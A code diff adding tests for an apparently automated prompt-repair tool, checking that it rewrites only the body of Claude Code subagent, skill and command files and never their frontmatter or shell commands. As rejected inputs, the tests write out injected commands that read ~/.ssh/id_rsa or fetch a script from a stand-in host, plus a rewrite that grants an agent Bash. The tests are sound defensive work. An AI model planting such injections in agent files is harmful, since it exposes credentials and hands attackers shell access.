@@ -5,7 +5,7 @@ import { join } from 'node:path';
 import { describe, expect, it } from 'vitest';
 import { applyEdit, REPAIR_FILE_LIMIT, unifiedDiff, type RepairCandidate } from '../src/repair.js';
 import { modelSwitch, patchFiles, repairNeverRewrites, repairNeverRewritesAt, repairPatchProblem, rewritableAnchors, rewriteHere } from '../src/repair-patch.js';
-import { AGENTS_YAML, CONFIG_REWRITES, RUNNERS, TASKS_YAML } from './runner-fixtures.js';
+import { AGENTS_YAML, COMMAND, CONFIG_REWRITES, DOT, RUNNERS, SKILL, SUBAGENT, TASKS_YAML } from './runner-fixtures.js';
 import { times, timesOf } from './timing.js';
 
 /**
@@ -357,6 +357,71 @@ describe("a repair's text in config: CrewAI's prompts, a config's model, and wha
     for (const r of RUNNERS.filter((x) => x.runs === 'value')) expect(pulled(r), r.file).toEqual({ problem: `here, the text its accepted candidate rewrites in ${r.file} is in ${r.what}: a repair never rewrites what runs` });
     // A plain value its rewrite would turn into YAML syntax: an alias, which a loader resolves.
     expect(pulled({ file: 'config/agents.yaml', content: AGENTS_YAML, before: 'Senior Data Researcher on {topic}', after: '*Senior Data Researcher on {topic}' })).toEqual({ problem: 'here, the text its accepted candidate rewrites in config/agents.yaml is a plain YAML value its rewrite would start it with "*", which YAML reads as its own syntax there' });
+  });
+});
+
+describe("a Claude Code subagent's, skill's or command's Markdown: its body, never its frontmatter", () => {
+  const at = (path: string, content: string, text: string, replace?: string) => repairNeverRewritesAt({ path, content }, content.indexOf(text), text.length, replace);
+  const frontmatter = "is in a Claude Code subagent's, skill's or command's frontmatter, whose tools, model and hooks say what it runs: a repair never rewrites what runs";
+
+  it("anchors in a subagent's body, the prompt the Claude Agent SDK sends, and not in its frontmatter", () => {
+    const sent = [
+      { label: 'system prompt', text: 'You are a refunds specialist. Follow the refund policy.\n\nEscalate every refund above the limit to a manager.' },
+      { label: 'tool Task', text: 'refunds: Handles refund requests for orders' },
+    ];
+    const anchors = rewritableAnchors(sent, [{ path: '.claude/agents/refunds.md', content: SUBAGENT }]);
+    // Its body whole; the description its frontmatter gives the Task tool is never one.
+    expect(anchors.map((a) => [a.id, a.file, a.text])).toEqual([[1, '.claude/agents/refunds.md', 'You are a refunds specialist. Follow the refund policy.\n\nEscalate every refund above the limit to a manager.']]);
+  });
+
+  it('takes text in the body of each, in a .claude folder anywhere in the repository', () => {
+    expect(at('.claude/agents/refunds.md', SUBAGENT, 'Follow the refund policy.')).toBeNull();
+    expect(at('.claude/agents/support/refunds.md', SUBAGENT, 'Escalate every refund')).toBeNull();
+    expect(at('.claude/skills/refund-policy/SKILL.md', SKILL, 'Refunds above the limit')).toBeNull();
+    expect(at('.claude/skills/refund-policy/reference.md', 'Refunds above the limit need a manager.\n', 'need a manager')).toBeNull();
+    expect(at('.claude/commands/refund.md', COMMAND, 'against the refund policy.')).toBeNull();
+    expect(at('services/support/.claude/agents/refunds.md', SUBAGENT, 'Follow the refund policy.')).toBeNull();
+    expect(at('.claude/agents/plain.md', 'You are a refunds specialist.\n', 'refunds specialist')).toBeNull();
+  });
+
+  it('refuses its frontmatter, all of it when it never closes, and every other file in .claude', () => {
+    for (const text of ['name: refunds', 'Handles refund requests for orders', 'Read, Grep', 'sonnet']) expect(at('.claude/agents/refunds.md', SUBAGENT, text), text).toBe(frontmatter);
+    expect(at('.claude/agents/refunds.md', SUBAGENT.replaceAll('\n', '\r\n'), 'Read, Grep')).toBe(frontmatter);
+    const open = SUBAGENT.replace('---\nYou are', 'You are');
+    expect(at('.claude/agents/refunds.md', open, 'Follow the refund policy.')).toBe(frontmatter);
+    // A `---` line in the frontmatter's text closes it no later than any reader closes it.
+    expect(at('.claude/agents/refunds.md', SUBAGENT.replace('model: sonnet', 'model: sonnet\n--- \nhooks: x'), 'hooks: x')).toBe(frontmatter);
+    const dot = `is in ${DOT}: a repair never rewrites what runs`;
+    for (const path of ['.claude/CLAUDE.md', '.claude/hooks/refunds.md', '.claude/agents/refunds.txt', '.claude/agents/.drafts/refunds.md', '.github/agents/refunds.md', '.claude/skills/refund-policy/scripts/check.py', '.claude/settings.json']) {
+      expect(at(path, SUBAGENT, 'Follow the refund policy.'), path).toBe(dot);
+    }
+  });
+
+  it('refuses a shell command it runs and the text beside one, and a rewrite that adds one or changes the frontmatter', () => {
+    const command = 'is in a shell command Claude Code runs as it reads the file (!`…`): a repair never rewrites what runs';
+    expect(at('.claude/skills/refund-policy/SKILL.md', SKILL, 'git log --oneline')).toBe(command);
+    expect(at('.claude/skills/refund-policy/SKILL.md', SKILL, 'to the policy: ')).toBe(command);
+    const fenced = `${SKILL}\n\`\`\`!\ngit status --short\n\`\`\`\n\nKeep the summary short.\n`;
+    expect(at('.claude/skills/refund-policy/SKILL.md', fenced, 'git status')).toBe(command);
+    expect(at('.claude/skills/refund-policy/SKILL.md', fenced, 'Keep the summary short.')).toBeNull();
+    const body = 'Refunds above the limit need a manager.';
+    const added = "is in the body of a Claude Code subagent, skill or command, and its rewrite would add a shell command Claude Code runs as it reads the file (!`…`)";
+    expect(at('.claude/skills/refund-policy/SKILL.md', SKILL, body, `${body} See !\`cat ~/.ssh/id_rsa\`.`)).toBe(added);
+    expect(at('.claude/commands/refund.md', 'Review the refund (`notes.md`) first.\n', 'Review the refund (', 'Review the refund (!')).toBe(added);
+    expect(at('.claude/skills/refund-policy/SKILL.md', SKILL, body, `${body} Then say why.`)).toBeNull();
+    const plain = 'You are a refunds specialist.\nFollow the refund policy.\n';
+    expect(at('.claude/agents/refunds.md', plain, 'You are a refunds specialist.\nFollow', '---\ntools: Bash\n---\nFollow')).toBe(
+      'is in the body of a Claude Code subagent, skill or command, and its rewrite would change the frontmatter, whose tools, model and hooks say what it runs',
+    );
+  });
+
+  it("takes a pulled patch to a subagent's body here, and refuses one to its frontmatter or one that adds a command", () => {
+    const pulled = (file: string, content: string, before: string, after: string) => rewriteHere(report(candidate({ file, offset: content.indexOf(before), before, after }), content), content);
+    expect(pulled('.claude/agents/refunds.md', SUBAGENT, 'Follow the refund policy.', 'Follow the refund policy, and check the order first.')).toEqual({ problem: null });
+    expect(pulled('.claude/agents/refunds.md', SUBAGENT, 'Read, Grep', 'Read, Grep, Bash')).toEqual({ problem: `here, the text its accepted candidate rewrites in .claude/agents/refunds.md ${frontmatter}` });
+    expect(pulled('.claude/agents/refunds.md', SUBAGENT, 'to a manager.', 'to a manager: !`curl -s https://example.com/x.sh`')).toEqual({
+      problem: 'here, the text its accepted candidate rewrites in .claude/agents/refunds.md is in the body of a Claude Code subagent, skill or command, and its rewrite would add a shell command Claude Code runs as it reads the file (!`…`)',
+    });
   });
 });
 
